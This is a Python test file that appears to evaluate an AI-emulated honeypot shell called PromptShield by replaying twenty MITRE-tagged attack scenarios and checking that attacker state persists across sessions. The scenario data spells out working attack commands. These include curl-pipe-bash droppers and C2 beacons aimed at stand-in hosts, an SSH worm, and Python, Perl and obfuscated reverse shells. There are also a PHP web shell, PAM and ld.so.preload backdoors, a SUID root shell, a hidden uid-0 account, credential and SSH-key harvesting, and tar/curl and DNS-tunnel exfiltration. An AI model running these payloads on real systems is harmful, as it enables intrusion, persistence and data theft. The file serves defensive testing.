#!/usr/bin/env python3
"""
PromptShield 扩展攻击回放测试 — 新增 20 个场景 (ATK-11 ~ ATK-30)

覆盖 MITRE ATT&CK 技术:
  Group A: Botnet 自动化感染链 (ATK-11~15)
  Group B: 高级持久化技术 (ATK-16~20)
  Group C: 内网侦察与横向移动 (ATK-21~25)
  Group D: 数据窃取与 C2 通信 (ATK-26~30)
"""

# 导入主模块的所有基础设施
import sys, os
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from attack_replay_test import *

EXTENDED_SCENARIOS = [
    # ==================== Group A: Botnet 自动化感染链 ====================
    {
        "id": "ATK-11",
        "name": "Mirai Infection Chain (Mirai 感染链)",
        "description": "经典 Mirai botnet 三连: wget → chmod → execute (MITRE T1059.004)",
        "source": "Mirai botnet source code analysis + DShield SSH logs",
        "session_a_commands": [
            "cd /tmp",
            "wget http://botnet.evil.com/bins/mirai.x86 -O /tmp/.sshd",
            "chmod 777 /tmp/.sshd",
            "cat > /tmp/.sshd << 'EOF'\n#!/bin/bash\nwhile true; do\n  curl -s http://c2.botnet.com/bot_register\n  sleep 300\ndone\nEOF",
            "chmod +x /tmp/.sshd",
        ],
        "session_b_commands": [
            "cat /tmp/.sshd",
            "ls -la /tmp/.sshd",
        ],
        "persistence_check": True,
        "verify_keywords": ["c2.botnet.com", "bot_register"],
        "verify_semantic": {
            "type": "file_content",
            "checks": [
                {"method": "regex", "pattern": r"(curl|wget).*https?://\S+"},
                {"method": "regex", "pattern": r"(while|loop|sleep).*\d+"},
            ],
        },
    },
    {
        "id": "ATK-12",
        "name": "Gafgyt Dropper (Gafgyt 下载器)",
        "description": "curl | sh 模式 + nohup 后台驻留 (MITRE T1105)",
        "source": "Gafgyt/Bashlite public malware analysis",
        "session_a_commands": [
            'echo "#!/bin/bash" > /var/tmp/.cache_update',
            'echo "nohup bash -c \'while true; do curl -s http://drop.malware.net/gafgyt | bash; sleep 600; done\' &" >> /var/tmp/.cache_update',
            "chmod +x /var/tmp/.cache_update",
        ],
        "session_b_commands": [
            "cat /var/tmp/.cache_update",
        ],
        "persistence_check": True,
        "verify_keywords": ["drop.malware.net", "gafgyt"],
        "verify_semantic": {
            "type": "file_content",
            "checks": [
                {"method": "regex", "pattern": r"(curl|wget).*https?://\S+.*\|.*bash"},
                {"method": "regex", "pattern": r"(nohup|while|sleep)"},
            ],
        },
    },
    {
        "id": "ATK-13",
        "name": "IRC Bot Deployment (IRC Botnet 部署)",
        "description": "安装 Perl IRC bot 连接 C2 频道 (MITRE T1071.001)",
        "source": "Cowrie honeypot IRC bot observations",
        "session_a_commands": [
            "mkdir -p /dev/shm/.x",
            'echo "#!/usr/bin/perl" > /dev/shm/.x/bot.pl',
            'echo "# IRC Bot Config" >> /dev/shm/.x/bot.pl',
            'echo "my $server = \\"irc.undernet.org\\";" >> /dev/shm/.x/bot.pl',
            'echo "my $channel = \\"#botnet-cmd\\";" >> /dev/shm/.x/bot.pl',
            'echo "my $nick = \\"bot_\".int(rand(9999));" >> /dev/shm/.x/bot.pl',
        ],
        "session_b_commands": [
            "cat /dev/shm/.x/bot.pl",
        ],
        "persistence_check": True,
        "verify_keywords": ["irc.undernet.org", "#botnet-cmd"],
        "verify_semantic": {
            "type": "file_content",
            "checks": [
                {"method": "regex", "pattern": r"(irc|IRC).*\.(org|net|com)"},
                {"method": "regex", "pattern": r"(channel|nick|server|bot)"},
            ],
        },
    },
    {
        "id": "ATK-14",
        "name": "SSH Worm Propagation (SSH 蠕虫横向传播)",
        "description": "扫描内网并用已知凭据传播 (MITRE T1021.004)",
        "source": "Linux.Wifatch / SSHDoor analysis",
        "session_a_commands": [
            'echo "#!/bin/bash" > /tmp/.spread.sh',
            'echo "for ip in $(seq 1 254); do" >> /tmp/.spread.sh',
            'echo "  sshpass -p \\"admin123\\" ssh -o StrictHostKeyChecking=no root@192.168.1.$ip \\"wget http://c2.worm.net/payload -O /tmp/.worm && chmod +x /tmp/.worm && /tmp/.worm\\" &" >> /tmp/.spread.sh',
            'echo "done" >> /tmp/.spread.sh',
            "chmod +x /tmp/.spread.sh",
        ],
        "session_b_commands": [
            "cat /tmp/.spread.sh",
        ],
        "persistence_check": True,
        "verify_keywords": ["192.168.1.", "c2.worm.net"],
        "verify_semantic": {
            "type": "file_content",
            "checks": [
                {"method": "regex", "pattern": r"(ssh|sshpass).*\d{1,3}\.\d{1,3}\.\d{1,3}"},
                {"method": "regex", "pattern": r"(wget|curl).*https?://\S+"},
            ],
        },
    },
    {
        "id": "ATK-15",
        "name": "DDoS Tool Installation (DDoS 工具安装)",
        "description": "部署 UDP flood DDoS 工具 (MITRE T1499)",
        "source": "SANS ISC DDoS tool observations in honeypots",
        "session_a_commands": [
            'echo "#!/bin/bash" > /opt/.ddos',
            'echo "# UDP Flood Tool" >> /opt/.ddos',
            'echo "TARGET=$1; PORT=$2; DURATION=$3" >> /opt/.ddos',
            'echo "timeout $DURATION bash -c \\"while true; do echo x > /dev/udp/$TARGET/$PORT; done\\"" >> /opt/.ddos',
            "chmod +x /opt/.ddos",
        ],
        "session_b_commands": [
            "cat /opt/.ddos",
        ],
        "persistence_check": True,
        "verify_keywords": ["UDP Flood", "/dev/udp"],
        "verify_semantic": {
            "type": "file_content",
            "checks": [
                {"method": "regex", "pattern": r"(udp|UDP|flood|Flood)"},
                {"method": "regex", "pattern": r"(/dev/udp|socket|SOCK_DGRAM)"},
            ],
        },
    },

    # ==================== Group B: 高级持久化技术 ====================
    {
        "id": "ATK-16",
        "name": "LD_PRELOAD Injection (动态库注入)",
        "description": "通过 ld.so.preload 劫持系统库 (MITRE T1574.006)",
        "source": "MITRE ATT&CK T1574.006 + HoneyComb benchmark",
        "session_a_commands": [
            "touch /usr/local/lib/libsystem_helper.so",
            'echo "/usr/local/lib/libsystem_helper.so" >> /etc/ld.so.preload',
        ],
        "session_b_commands": [
            "cat /etc/ld.so.preload",
            "ls -la /usr/local/lib/libsystem_helper.so",
        ],
        "persistence_check": True,
        "verify_keywords": ["libsystem_helper.so"],
        "verify_semantic": {
            "type": "file_content",
            "checks": [
                {"method": "regex", "pattern": r"\.so\b"},
                {"method": "contains_any", "values": ["ld.so.preload", "libsystem", ".so"]},
            ],
        },
    },
    {
        "id": "ATK-17",
        "name": "PAM Backdoor (PAM 认证后门)",
        "description": "修改 PAM 配置实现免密登录 (MITRE T1556.003)",
        "source": "MITRE ATT&CK T1556.003 + HoneyComb benchmark",
        "session_a_commands": [
            'echo "auth sufficient pam_permit.so" > /tmp/pam_evil',
            "cat /etc/pam.d/sshd >> /tmp/pam_evil",
            "cat /tmp/pam_evil > /etc/pam.d/common-auth",
        ],
        "session_b_commands": [
            "head -1 /etc/pam.d/common-auth",
        ],
        "persistence_check": True,
        "verify_keywords": ["pam_permit.so"],
        "verify_semantic": {
            "type": "pam_config",
            "checks": [
                {"method": "regex", "pattern": r"auth\s+(sufficient|required)\s+pam_\w+\.so"},
            ],
        },
    },
    {
        "id": "ATK-18",
        "name": "RC Local Backdoor (启动脚本后门)",
        "description": "修改 rc.local 植入开机自启 (MITRE T1037.004)",
        "source": "MITRE ATT&CK T1037.004 + HoneyComb benchmark",
        "session_a_commands": [
            'echo "#!/bin/bash" > /etc/rc.local',
            'echo "nohup /usr/bin/python3 -c \\"import socket,subprocess;s=socket.socket();s.connect((\'10.0.0.1\',4444));subprocess.call([\'bash\',\'-i\'],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())\\" &" >> /etc/rc.local',
            "chmod +x /etc/rc.local",
        ],
        "session_b_commands": [
            "cat /etc/rc.local",
        ],
        "persistence_check": True,
        "verify_keywords": ["10.0.0.1", "4444", "socket"],
        "verify_semantic": {
            "type": "file_content",
            "checks": [
                {"method": "regex", "pattern": r"(python|socket|subprocess)"},
                {"method": "regex", "pattern": r"(connect|tcp|\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}).*\d{4,5}"},
            ],
        },
    },
    {
        "id": "ATK-19",
        "name": "PHP Web Shell (Web Shell 植入)",
        "description": "在 Web 目录创建隐藏 PHP 后门 (MITRE T1505.003)",
        "source": "MITRE ATT&CK T1505.003 + HoneyComb benchmark",
        "session_a_commands": [
            "mkdir -p /var/www/html",
            'echo "<?php if(isset($_REQUEST[\'c\'])){system($_REQUEST[\'c\']);} ?>" > /var/www/html/.error_handler.php',
        ],
        "session_b_commands": [
            "cat /var/www/html/.error_handler.php",
        ],
        "persistence_check": True,
        "verify_keywords": ["$_REQUEST", "system"],
        "verify_semantic": {
            "type": "web_shell",
            "checks": [
                {"method": "regex", "pattern": r"<\?php"},
                {"method": "regex", "pattern": r"(system|exec|passthru|shell_exec|\$_REQUEST|\$_GET|\$_POST)"},
            ],
        },
    },
    {
        "id": "ATK-20",
        "name": "SUID Backdoor (SUID 提权后门)",
        "description": "创建 SUID shell 实现持久提权 (MITRE T1548.001)",
        "source": "Linux privilege escalation techniques",
        "session_a_commands": [
            "cp /bin/bash /tmp/.rootshell",
            "chmod u+s /tmp/.rootshell",
            "ls -la /tmp/.rootshell",
        ],
        "session_b_commands": [
            "ls -la /tmp/.rootshell",
        ],
        "persistence_check": True,
        "verify_keywords": [".rootshell"],
        "verify_semantic": {
            "type": "suid_binary",
            "checks": [
                {"method": "regex", "pattern": r"-..s"},
            ],
        },
    },

    # ==================== Group C: 内网侦察与横向移动 ====================
    {
        "id": "ATK-21",
        "name": "Internal Network Discovery (内网发现)",
        "description": "使用多种方法探测内网结构 (MITRE T1046)",
        "source": "Cowrie honeypot post-exploitation observations",
        "session_a_commands": [
            "ip route",
            "arp -a",
            "cat /etc/resolv.conf",
            "cat /proc/net/arp",
        ],
        "session_b_commands": [],
        "persistence_check": False,
    },
    {
        "id": "ATK-22",
        "name": "Credential Harvesting (凭据收集)",
        "description": "搜索文件系统中的密码和密钥 (MITRE T1552.001)",
        "source": "Post-exploitation frameworks (LinPEAS/LinEnum)",
        "session_a_commands": [
            "find / -name '*.conf' -exec grep -l 'password' {} \\; 2>/dev/null",
            "find / -name '.env' 2>/dev/null",
            "cat /etc/shadow",
            "find /home -name 'id_rsa' 2>/dev/null",
        ],
        "session_b_commands": [],
        "persistence_check": False,
    },
    {
        "id": "ATK-23",
        "name": "Container Escape Probe (容器逃逸探测)",
        "description": "检测是否在 Docker/K8s 容器中运行 (MITRE T1610)",
        "source": "Container security research",
        "session_a_commands": [
            "cat /proc/1/cgroup",
            "ls /.dockerenv",
            "cat /proc/self/mountinfo | grep docker",
            "hostname",
        ],
        "session_b_commands": [],
        "persistence_check": False,
    },
    {
        "id": "ATK-24",
        "name": "SSH Private Key Theft (SSH 私钥窃取)",
        "description": "搜集所有用户的 SSH 私钥 (MITRE T1552.004)",
        "source": "APT lateral movement techniques",
        "session_a_commands": [
            "find /home -name 'id_rsa' -o -name 'id_ed25519' 2>/dev/null",
            "find /root -name 'id_rsa' -o -name 'id_ed25519' 2>/dev/null",
            "cat /etc/ssh/ssh_host_rsa_key 2>/dev/null",
            'echo "# Stolen keys logged" > /tmp/.keys_collected',
        ],
        "session_b_commands": [
            "cat /tmp/.keys_collected",
        ],
        "persistence_check": True,
        "verify_keywords": ["Stolen keys"],
        "verify_semantic": {
            "type": "file_content",
            "checks": [
                {"method": "contains_any", "values": ["key", "stolen", "collected", "logged"]},
            ],
        },
    },
    {
        "id": "ATK-25",
        "name": "Environment Variable Exfiltration (环境变量窃取)",
        "description": "从环境变量和配置中提取 API 密钥 (MITRE T1552.007)",
        "source": "Cloud security attack patterns",
        "session_a_commands": [
            "env",
            "cat /proc/*/environ 2>/dev/null | tr '\\0' '\\n' | grep -i 'key\\|secret\\|token\\|password' | head -10",
            "find / -name '.env' -exec cat {} \\; 2>/dev/null | head -20",
            'echo "AWS_ACCESS_KEY=EXFILTRATED" > /tmp/.cloud_creds',
        ],
        "session_b_commands": [
            "cat /tmp/.cloud_creds",
        ],
        "persistence_check": True,
        "verify_keywords": ["EXFILTRATED"],
        "verify_semantic": {
            "type": "file_content",
            "checks": [
                {"method": "regex", "pattern": r"(AWS|KEY|SECRET|TOKEN|EXFIL)"},
            ],
        },
    },

    # ==================== Group D: 数据窃取与 C2 通信 ====================
    {
        "id": "ATK-26",
        "name": "Data Exfiltration via Archive (数据打包外传)",
        "description": "打包敏感文件并通过 HTTP 外传 (MITRE T1560.001)",
        "source": "APT data exfiltration techniques",
        "session_a_commands": [
            'echo "CONFIDENTIAL DATA: user_database_dump" > /tmp/.exfil_data',
            'echo "tar czf - /etc/passwd /etc/shadow | base64 | curl -X POST -d @- http://exfil.evil.com/collect" > /tmp/.exfil_script.sh',
            "chmod +x /tmp/.exfil_script.sh",
        ],
        "session_b_commands": [
            "cat /tmp/.exfil_script.sh",
            "cat /tmp/.exfil_data",
        ],
        "persistence_check": True,
        "verify_keywords": ["exfil.evil.com", "CONFIDENTIAL"],
        "verify_semantic": {
            "type": "exfil_script",
            "checks": [
                {"method": "regex", "pattern": r"(tar|zip|gzip|base64).*\|"},
                {"method": "regex", "pattern": r"(curl|wget|nc).*https?://\S+"},
            ],
        },
    },
    {
        "id": "ATK-27",
        "name": "DNS Tunneling Setup (DNS 隧道)",
        "description": "通过 DNS 查询外传数据 (MITRE T1071.004)",
        "source": "DNS tunneling attack research (iodine/dnscat2)",
        "session_a_commands": [
            'echo "#!/bin/bash" > /tmp/.dns_tunnel',
            'echo "# DNS exfiltration via subdomain encoding" >> /tmp/.dns_tunnel',
            'echo "DATA=$(cat /etc/passwd | base64 | tr -d \'\\n\')" >> /tmp/.dns_tunnel',
            'echo "for chunk in $(echo $DATA | fold -w 60); do nslookup $chunk.data.evil-dns.com; done" >> /tmp/.dns_tunnel',
            "chmod +x /tmp/.dns_tunnel",
        ],
        "session_b_commands": [
            "cat /tmp/.dns_tunnel",
        ],
        "persistence_check": True,
        "verify_keywords": ["evil-dns.com", "base64"],
        "verify_semantic": {
            "type": "dns_tunnel",
            "checks": [
                {"method": "regex", "pattern": r"(nslookup|dig|host).*\.\S+\.(com|net|org)"},
                {"method": "regex", "pattern": r"base64"},
            ],
        },
    },
    {
        "id": "ATK-28",
        "name": "Multi-Language Reverse Shell (多语言反弹 Shell)",
        "description": "使用 Python/Perl/Ruby 多种语言的反弹 shell (MITRE T1059)",
        "source": "Reverse shell cheat sheets + Cowrie observations",
        "session_a_commands": [
            "echo 'python3 -c \"import os,socket,subprocess;s=socket.socket();s.connect((chr(49)+chr(48)+chr(46)+chr(48)+chr(46)+chr(48)+chr(46)+chr(49),5555));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([chr(98)+chr(97)+chr(115)+chr(104),chr(45)+chr(105)])\"' > /tmp/.py_shell",
            "echo 'perl -MSocket -e \"$p=5556;socket(S,2,1,0);connect(S,pack_sockaddr_in($p,inet_aton(chr(49).chr(48).chr(46).chr(48).chr(46).chr(48).chr(46).chr(49))));open(STDIN,\\\">&S\\\");open(STDOUT,\\\">&S\\\");exec(chr(98).chr(97).chr(115).chr(104))\"' > /tmp/.pl_shell",
        ],
        "session_b_commands": [
            "cat /tmp/.py_shell",
            "cat /tmp/.pl_shell",
        ],
        "persistence_check": True,
        "verify_keywords": ["10.0.0.1", "5555"],
        "verify_semantic": {
            "type": "reverse_shell",
            "checks": [
                {"method": "regex", "pattern": r"(socket|connect|dup2|subprocess|exec)"},
                {"method": "regex", "pattern": r"(python|perl|ruby|php)"},
            ],
        },
    },
    {
        "id": "ATK-29",
        "name": "Process and File Hiding (进程和文件隐藏)",
        "description": "使用 rootkit 技术隐藏恶意进程 (MITRE T1014)",
        "source": "Linux rootkit techniques",
        "session_a_commands": [
            "mkdir -p /dev/shm/.../.hidden",
            'echo "#!/bin/bash" > /dev/shm/.../.hidden/rootkit.sh',
            'echo "# Hide from ps by renaming process" >> /dev/shm/.../.hidden/rootkit.sh',
            'echo "exec -a \'[kworker/0:1]\' /bin/bash -c \'while true; do curl -s http://c2.rootkit.net/beacon; sleep 3600; done\'" >> /dev/shm/.../.hidden/rootkit.sh',
            "chmod +x /dev/shm/.../.hidden/rootkit.sh",
        ],
        "session_b_commands": [
            "cat /dev/shm/.../.hidden/rootkit.sh",
        ],
        "persistence_check": True,
        "verify_keywords": ["kworker", "c2.rootkit.net"],
        "verify_semantic": {
            "type": "rootkit",
            "checks": [
                {"method": "regex", "pattern": r"(exec\s+-a|kworker|\[k)"},
                {"method": "regex", "pattern": r"(curl|wget|nc).*https?://\S+"},
            ],
        },
    },
    {
        "id": "ATK-30",
        "name": "Full APT Kill Chain (完整 APT 攻击链)",
        "description": "从侦察到数据窃取的完整攻击链 — PromptShield 终极测试",
        "source": "Synthesized from APT28/Lazarus Group TTPs",
        "session_a_commands": [
            # Phase 1: 侦察
            "uname -a",
            "id",
            "cat /etc/passwd | wc -l",
            # Phase 2: 持久化 - 用户后门
            "useradd -m -s /bin/bash -o -u 0 ghost_admin",
            "echo 'ghost_admin:G0stP@ss!' | chpasswd",
            # Phase 3: 持久化 - SSH 密钥
            "mkdir -p /home/ghost_admin/.ssh",
            'echo "ssh-ed25519 AAAAC3...APTkey apt_operator@c2" >> /home/ghost_admin/.ssh/authorized_keys',
            # Phase 4: 持久化 - Cron beacon
            '(crontab -l 2>/dev/null; echo "*/30 * * * * curl -s http://apt.c2server.net/heartbeat?id=$(hostname)") | crontab -',
            # Phase 5: 数据收集脚本
            'echo "#!/bin/bash" > /usr/local/sbin/.collector',
            'echo "tar czf /tmp/.data.tar.gz /etc/passwd /etc/shadow /root/.ssh/ /home/*/.ssh/ 2>/dev/null" >> /usr/local/sbin/.collector',
            'echo "curl -X POST -F file=@/tmp/.data.tar.gz http://apt.c2server.net/exfil" >> /usr/local/sbin/.collector',
            "chmod +x /usr/local/sbin/.collector",
        ],
        "session_b_commands": [
            "id ghost_admin",
            "cat /home/ghost_admin/.ssh/authorized_keys",
            "crontab -l",
            "cat /usr/local/sbin/.collector",
        ],
        "persistence_check": True,
        "verify_keywords": ["ghost_admin", "apt_operator@c2", "apt.c2server.net", ".collector"],
        "verify_semantic": {
            "type": "multi_stage",
            "checks": [
                {"method": "regex", "pattern": r"uid=\d+"},
                {"method": "regex", "pattern": r"ssh-(rsa|ed25519)\s+AAAA"},
                {"method": "regex", "pattern": r"[\*/0-9]+\s+[\*/0-9]+\s+[\*/0-9]+"},
                {"method": "regex", "pattern": r"(curl|wget|tar).*https?://\S+"},
            ],
        },
    },
]


async def main():
    print(f"{'#'*60}")
    print(f"  PromptShield Extended Attack Replay Test")
    print(f"  New Scenarios: {len(EXTENDED_SCENARIOS)} (ATK-11 ~ ATK-30)")
    print(f"  Model: {AI_MODEL}")
    print(f"  Time: {datetime.now().isoformat()}")
    print(f"{'#'*60}")

    storage_base = "./attack_replay_memory_ext"
    if os.path.exists(storage_base):
        shutil.rmtree(storage_base)

    results = []
    for scenario in EXTENDED_SCENARIOS:
        r = await run_attack_scenario(scenario, storage_base)
        results.append(r)

    # Summary
    print(f"\n{'='*60}")
    print(f"  EXTENDED SCENARIOS SUMMARY (ATK-11 ~ ATK-30)")
    print(f"{'='*60}")

    persistence_tests = [r for r in results if r.persistence_passed is not None]
    passed = sum(1 for r in persistence_tests if r.persistence_passed)
    total = len(persistence_tests)
    total_tokens = sum(r.total_tokens for r in results)
    total_latency = sum(r.total_latency_ms for r in results)

    # Group results
    groups = {
        "Group A (Botnet)": [r for r in results if r.scenario_id in [f"ATK-{i}" for i in range(11,16)]],
        "Group B (Persistence)": [r for r in results if r.scenario_id in [f"ATK-{i}" for i in range(16,21)]],
        "Group C (Lateral)": [r for r in results if r.scenario_id in [f"ATK-{i}" for i in range(21,26)]],
        "Group D (Exfil)": [r for r in results if r.scenario_id in [f"ATK-{i}" for i in range(26,31)]],
    }

    for gname, gresults in groups.items():
        print(f"\n  {gname}:")
        for r in gresults:
            if r.persistence_passed is None:
                status = "⚪ N/A"
            elif r.persistence_passed:
                status = "✅ PASS"
            else:
                status = f"❌ FAIL (missing: {r.keywords_missing})"
            print(f"    {r.scenario_id}: {status} — {r.name}")

    print(f"\n  Persistence Tests: {passed}/{total} ({passed/total*100:.0f}%)" if total else "")
    print(f"  Total Tokens: {total_tokens:,}")
    print(f"  Total Latency: {total_latency/1000:.1f}s")

    # Save
    report = {
        "meta": {
            "test_time": datetime.now().isoformat(),
            "model": AI_MODEL,
            "scenarios": "ATK-11 to ATK-30",
            "persistence_passed": passed,
            "persistence_total": total,
            "total_tokens": total_tokens,
        },
        "results": [asdict(r) for r in results],
    }
    fname = f"attack_replay_extended_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    with open(fname, 'w', encoding='utf-8') as f:
        json.dump(report, f, indent=2, ensure_ascii=False)
    print(f"\n  📄 Report: {fname}")


if __name__ == "__main__":
    asyncio.run(main())
